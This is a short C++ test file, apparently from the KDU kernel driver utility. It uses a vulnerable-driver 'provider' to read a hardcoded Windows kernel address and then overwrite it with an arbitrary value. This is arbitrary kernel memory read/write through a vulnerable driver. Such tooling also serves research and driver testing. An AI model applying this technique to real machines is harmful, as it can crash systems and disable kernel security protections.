/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       TESTS.CPP
*
*  VERSION:     1.00
*
*  DATE:        02 Feb 2020
*
*  KDU tests.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

VOID KDUTest()
{
    PKDU_CONTEXT Context;
    ULONG_PTR objectAddress = 0, value = 0;

    Context = KDUProviderCreate(4, FALSE, 17763, GetModuleHandle(NULL), ActionTypeMapDriver);
    if (Context) {

        if (supQueryObjectFromHandle(Context->DeviceHandle, &objectAddress)) {


            FILE_OBJECT fileObject;

            RtlSecureZeroMemory(&fileObject, sizeof(FILE_OBJECT));

            objectAddress = 0xfffff800e5566d18;

            KDUReadKernelVM(Context,
                objectAddress,
                &value,
                sizeof(value));

            ULONG_PTR newValue = 0xABCDEF0;

            KDUWriteKernelVM(Context,
                objectAddress,
                &newValue,
                sizeof(newValue));

            Beep(0, 0);

        }
        
        KDUProviderRelease(Context);
    }
}
